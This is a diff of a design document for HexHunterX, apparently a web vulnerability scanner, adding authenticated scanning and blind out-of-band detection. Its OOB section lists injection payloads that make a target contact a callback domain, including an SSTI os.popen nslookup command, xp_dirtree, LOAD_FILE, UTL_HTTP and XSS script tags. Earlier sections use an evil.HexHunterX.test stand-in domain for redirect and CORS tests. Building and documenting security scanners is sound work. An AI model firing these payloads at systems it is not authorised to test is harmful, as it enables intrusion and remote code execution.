@@ -1,6 +1,6 @@
-# HexHunter -- Feature Deep Dive
+﻿# HexHunterX -- Feature Deep Dive
 
-A detailed breakdown of every feature in HexHunter: how it works, how it was built, and the efficiency techniques behind each component.
+A detailed breakdown of every feature in HexHunterX: how it works, how it was built, and the efficiency techniques behind each component.
 
 ---
 
@@ -19,6 +19,8 @@ A detailed breakdown of every feature in HexHunter: how it works, how it was bui
 11. [Networking Layer](#11-networking-layer)
 12. [CLI Interface](#12-cli-interface)
 13. [Logging System](#13-logging-system)
+14. [Authenticated Scanning](#14-authenticated-scanning)
+15. [Blind/OOB Detection](#15-blindoob-detection)
 
 ---
 
@@ -28,7 +30,7 @@ A detailed breakdown of every feature in HexHunter: how it works, how it was bui
 
 ### How It Runs
 
-The engine is the brain of HexHunter. When you run `python main.py -t target.com --full-scan`, this happens:
+The engine is the brain of HexHunterX. When you run `python main.py -t target.com --full-scan`, this happens:
 
 ```
 CLI Parser --> Config Loader --> Engine.initialize()
@@ -51,11 +53,11 @@ Each phase calls its corresponding module, collects results, and stores them in 
 
 ### How It Was Built
 
-The engine uses Python's `asyncio` as the foundation. The `HexHunterEngine` class manages the lifecycle:
+The engine uses Python's `asyncio` as the foundation. The `HexHunterXEngine` class manages the lifecycle:
 
-1. **`initialize()`** -- connects to SQLite, creates the HTTP client with connection pooling
+1. **`initialize()`** -- connects to SQLite, creates the HTTP client with connection pooling, sets up authentication (cookie/JWT/auto-login), and initializes the Interactsh OOB client if `--oob` is enabled.
 2. **`run()`** -- validates the target, then iterates through the requested phases
-3. **`shutdown()`** -- closes all connections gracefully
+3. **`shutdown()`** -- closes all connections gracefully, deregisters from Interactsh
 
 The `TaskScheduler` handles concurrent task execution using `asyncio.Semaphore` to cap the number of simultaneous tasks (default: 50). This prevents resource exhaustion.
 
@@ -223,7 +225,7 @@ Uses `asyncio.open_connection()` for non-blocking TCP connections with a 2-secon
 
 #### Efficiency
 
-- **Baseline 404 detection**: Many servers return 200 OK for everything with a custom "not found" page. HexHunter requests a garbage path first and uses its response size as a baseline to filter these out.
+- **Baseline 404 detection**: Many servers return 200 OK for everything with a custom "not found" page. HexHunterX requests a garbage path first and uses its response size as a baseline to filter these out.
 - **Smart deduplication**: If more than 50% of results share the same response size, they're likely all the same custom 404 page and are discarded.
 - **Concurrent with semaphore**: 30 simultaneous requests.
 
@@ -307,9 +309,10 @@ Then checks for backup files of discovered endpoints (appending `.bak`, `.old`, 
 
 The `PayloadEngine` is a static utility that provides:
 
-1. **Categorized payloads**: XSS, SQLi, redirect, IDOR, SSTI -- each with purpose-built payload lists.
+1. **Categorized payloads**: XSS, SQLi, redirect, IDOR, SSTI, SSRF, NoSQLi, CSRF, CORS -- each with purpose-built payload lists.
 2. **Encoding**: URL encoding, double URL encoding, base64, HTML encoding.
 3. **PoC generation**: Creates formatted Proof-of-Concept markdown with reproduction steps.
+4. **OOB payloads**: When `--oob` is enabled, the Interactsh client generates additional callback-domain payloads that are injected alongside standard payloads.
 
 Other modules call `PayloadEngine.get_payloads("xss")` to get the appropriate payloads for their detection type.
 
@@ -317,7 +320,7 @@ Other modules call `PayloadEngine.get_payloads("xss")` to get the appropriate pa
 
 ## 6. Vulnerability Detection
 
-**Files:** `modules/vulns/xss.py`, `modules/vulns/sqli.py`, `modules/vulns/redirect.py`, `modules/vulns/idor.py`, `modules/vulns/misconfig.py`
+**Files:** `modules/vulns/xss.py`, `modules/vulns/sqli.py`, `modules/vulns/ssti.py`, `modules/vulns/ssrf.py`, `modules/vulns/nosqli.py`, `modules/vulns/csrf.py`, `modules/vulns/cors.py`, `modules/vulns/redirect.py`, `modules/vulns/idor.py`, `modules/vulns/misconfig.py`
 
 ### 6.1 XSS Detection (Reflected + DOM)
 
@@ -383,7 +386,7 @@ Other modules call `PayloadEngine.get_payloads("xss")` to get the appropriate pa
 ```
 1. Identify redirect parameters (from URL or common names like url, redirect, next, goto)
 2. For each parameter:
-   a. Inject external domain: https://evil.hexhunter.test
+   a. Inject external domain: https://evil.HexHunterX.test
    b. Send request WITHOUT following redirects
    c. Check if response is 301/302/307/308
    d. Check Location header for external domain
@@ -423,7 +426,7 @@ Other modules call `PayloadEngine.get_payloads("xss")` to get the appropriate pa
 
 **CORS Check:**
 ```
-1. Send request with Origin: https://evil.hexhunter.test
+1. Send request with Origin: https://evil.HexHunterX.test
 2. Check Access-Control-Allow-Origin header:
    - Reflects evil origin + Allow-Credentials: true --> CRITICAL
    - Reflects evil origin without credentials --> MEDIUM
@@ -525,14 +528,14 @@ Each integration follows the same pattern (abstract base class):
 5. Parse output (JSON/JSONL) into unified schema
 ```
 
-If a tool isn't installed, HexHunter logs a warning and falls back to its built-in Python implementation.
+If a tool isn't installed, HexHunterX logs a warning and falls back to its built-in Python implementation.
 
 ### How It Was Built
 
 The `BaseToolWrapper` abstract class enforces a consistent interface:
 - `tool_name` -- binary name to look for on PATH
 - `build_command(**kwargs)` -- construct CLI arguments
-- `parse_output(stdout)` -- transform tool output into HexHunter's format
+- `parse_output(stdout)` -- transform tool output into HexHunterX's format
 
 Each wrapper is ~40 lines of code because all the execution logic lives in the base class.
 
@@ -653,6 +656,11 @@ Request flow:
 - Every request/response is stored as `HTTPRequest`/`HTTPResponse` dataclasses
 - Includes: URL, method, headers, body, status code, elapsed time, redirect chain
 
+**Authentication Support:**
+- `set_auth(headers, cookies)` -- injects auth headers and cookies into the session at runtime
+- `CookieJar(unsafe=True)` -- enables cross-domain cookie sending required for scanning multiple subdomains with the same session
+- Auth headers/cookies are pre-loaded before `start()` and can be updated live during the scan
+
 ### Efficiency
 
 - **Connection reuse**: TCP handshake and TLS negotiation happen once per host, not per request.
@@ -674,6 +682,8 @@ Uses Python's `argparse` with grouped arguments:
 Scan Phases:     --recon, --scan, --fuzz, --vuln, --full-scan
 Configuration:   --config, --threads, --rate-limit, --timeout
 Output:          --output, --format, --silent
+Authentication:  --cookie, --auth-token, --auth-header, --login-url, --login-user, --login-pass
+OOB Detection:   --oob, --oob-server, --oob-token, --oob-poll, --oob-wait
 Advanced:        --resume, --db, --scope-file, --exclude-file
 ```
 
@@ -696,7 +706,7 @@ The parser returns a flat dictionary that the engine consumes. CLI arguments ove
 Dual-output logging:
 
 1. **Console**: Rich library with color-coded output, progress bars, and severity badges
-2. **File**: Plain text with timestamps, written to `logs/hexhunter_YYYYMMDD.log`
+2. **File**: Plain text with timestamps, written to `logs/HexHunterX_YYYYMMDD.log`
 
 Special log methods:
 - `logger.phase("RECON")` -- prints a visual phase separator
@@ -705,7 +715,7 @@ Special log methods:
 
 ### Efficiency
 
-- **Singleton pattern**: `HexHunterLogger.get_logger("module")` returns cached instances. Creating a logger for "recon.subdomains" twice returns the same object.
+- **Singleton pattern**: `HexHunterXLogger.get_logger("module")` returns cached instances. Creating a logger for "recon.subdomains" twice returns the same object.
 - **Level filtering**: Console shows INFO+, file captures DEBUG+. Verbose debug output doesn't clutter the terminal.
 - **Lazy formatting**: Log messages only format if the level is enabled.
 
@@ -739,3 +749,126 @@ Special log methods:
 5. **Modular design**: Each module is independent. You can import and use `XSSDetector` or `PortScanner` standalone without the rest of the framework.
 
 6. **Scan resume**: Database-backed state means interrupted scans can resume from the last completed phase, avoiding redundant work on large targets.
+
+7. **Auth-first design**: Authentication is injected at the HTTP client level, meaning every module automatically benefits from auth without needing module-specific auth code.
+
+8. **OOB as a layer**: Blind detection is injected as an optional layer into existing detectors. Detectors work identically with or without `--oob`.
+
+---
+
+## 14. Authenticated Scanning
+
+**File:** `utils/auth.py`
+
+### How It Runs
+
+```
+CLI flags (--cookie / --auth-token / --login-url + creds)
+                |
+                v
+        AuthManager.from_config(cli_args)
+                |
+                v
+    ┌───────────────────────────────┐
+    │ MODE: Cookie                  │  Parse "name=val; name2=val2"
+    │ MODE: Bearer                  │  Set Authorization: Bearer <token>
+    │ MODE: Custom Header           │  Set X-API-Key: <value>
+    │ MODE: Auto-Login              │  GET login page → extract CSRF →
+    │                               │  detect field names → POST creds →
+    │                               │  capture Set-Cookie
+    └───────────────┬───────────────┘
+                    |
+                    v
+        http_client.set_auth(headers, cookies)
+                    |
+                    v
+        All subsequent requests carry auth
+```
+
+### Auto-Login Details
+
+1. **GET the login page** → download the form
+2. **Extract CSRF token** → searches 15+ known field names (`csrf_token`, `_csrf`, `authenticity_token`, `__RequestVerificationToken`, etc.)
+3. **Detect field names** → finds `type="password"` input and the text/email input near it
+4. **POST credentials** → URL-encoded form data with CSRF token
+5. **Capture cookies** → extracts `Set-Cookie` headers from the response
+6. **Verify success** → checks for redirect (301/302) or success keywords (`dashboard`, `welcome`, `logout`)
+
+### Session Management
+
+- **Refresh**: Before the vuln phase, `refresh_if_needed()` GETs a protected page. If it gets a login page back (detected via keywords), it re-authenticates automatically.
+- **Cross-domain**: `CookieJar(unsafe=True)` ensures cookies are sent to all subdomains of the target, not just the exact login domain.
+
+### Efficiency
+
+- **Zero module changes needed**: Auth is injected at the `AsyncHTTPClient` level. Every detector, fuzzer, and scanner automatically sends authenticated requests.
+- **Lazy re-auth**: Only re-authenticates if the session has actually expired. No unnecessary login requests.
+- **CSRF-aware**: Handles CSRF-protected login forms that would reject plain credential POSTs.
+
+---
+
+## 15. Blind/OOB Detection
+
+**File:** `integrations/interactsh.py`
+
+### How It Runs
+
+```
+--oob flag enabled
+        |
+        v
+InteractshClient.register() → get unique callback domain
+        |
+        v
+Generate per-test OOB payloads:
+    SSRF: http://{token}.{domain}
+    SQLi: xp_dirtree '\\{token}.{domain}\a'
+    SSTI: {{os.popen('nslookup {token}.{domain}')}}
+    XSS:  <img src=http://{token}.{domain}>
+        |
+        v
+Detectors inject OOB payloads alongside standard payloads
+        |
+        v
+Background polling task checks for callbacks every 5s
+        |
+        v
+After all detectors finish → wait 30s for late callbacks
+        |
+        v
+Any DNS/HTTP callback received → confirmed blind vuln
+        |
+        v
+InteractshClient.get_findings() → convert to vulnerability reports
+```
+
+### Payload Tracking
+
+Each OOB payload gets a unique 12-character token. The token maps back to:
+- **vuln_type**: Which detector injected it (ssrf, sqli, ssti, xss)
+- **target_url**: Which URL was being tested
+- **param_name**: Which parameter was injected
+- **payload**: The original payload template
+
+When a callback arrives, the token is extracted from the subdomain to identify exactly which test triggered it.
+
+### Blind Detection Capabilities
+
+| Vuln Type | OOB Payload | Callback Signal | Severity |
+|-----------|-------------|-----------------|----------|
+| Blind SSRF | `http://{oob}` | HTTP callback | Critical |
+| Blind SQLi (MSSQL) | `xp_dirtree '\\{oob}\a'` | DNS callback | Critical |
+| Blind SQLi (MySQL) | `LOAD_FILE('\\\\{oob}\\a')` | DNS callback | Critical |
+| Blind SQLi (Oracle) | `UTL_HTTP.REQUEST('http://{oob}')` | HTTP callback | Critical |
+| Blind SSTI (Jinja2) | `{{os.popen('nslookup {oob}')}}` | DNS callback | Critical |
+| Blind SSTI (Twig) | `{{['nslookup {oob}']\|filter('system')}}` | DNS callback | Critical |
+| Stored XSS | `<img src=http://{oob}>` | HTTP callback | High |
+| Blind XSS | `<script src=http://{oob}>` | HTTP callback | High |
+
+### Efficiency
+
+- **Fire and forget**: OOB payloads are injected like normal payloads. No extra waiting per request.
+- **Background polling**: A single async task polls every 5s without blocking the main scan.
+- **Deduplication**: If the same (vuln_type, url, param) combination triggers multiple callbacks, only one finding is created.
+- **No infrastructure needed**: Uses the public `oast.pro` server by default. Self-hosting is optional.
+- **Graceful fallback**: If Interactsh registration fails, standard detection continues without OOB payloads.
